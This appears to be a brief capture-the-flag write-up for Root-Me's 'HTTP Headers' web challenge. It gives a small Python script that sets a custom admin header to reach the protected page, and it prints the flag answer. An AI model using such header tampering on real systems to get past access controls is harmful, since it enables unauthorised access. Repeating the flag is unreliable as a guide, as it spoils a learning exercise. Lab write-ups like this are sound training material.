---

title: HTTP Headers
link: https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers

---

We can find in the request a HTTP header that is set to none: `Header-RootMe-Admin`, and with a very little python script we can get the flag:


    import requests
    s = requests.Session()
    s.headers['Header-RootMe-Admin'] = True
    print s.get('http://challenge01.root-me.org/web-serveur/ch5/').content


> HeadersMayBeUseful
